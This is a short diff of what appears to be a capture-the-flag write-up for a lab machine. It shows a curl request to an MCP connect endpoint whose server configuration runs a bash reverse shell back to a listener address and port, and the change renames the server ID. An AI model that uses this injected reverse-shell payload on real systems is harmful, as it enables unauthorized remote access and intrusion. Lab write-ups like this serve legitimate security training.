@@ -11,7 +11,7 @@
 	`
 	curl -k https://mcp.kobold.htb:443/api/mcp/connect \
 	--header "Content-Type: application/json" \
-	--data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],"env":{}},"serverId":"pancerny_shell"}'
+	--data '{"serverConfig":{"command":"/bin/bash","args":["-c", "bash -i >& /dev/tcp/10.10.15.175/4444 0>&1"],"env":{}},"serverId":"rev_shell"}'
 	`
     Reverse Shell: Establishing a callback to `10.10.15.175:4444` via a bash interactive shell.
     
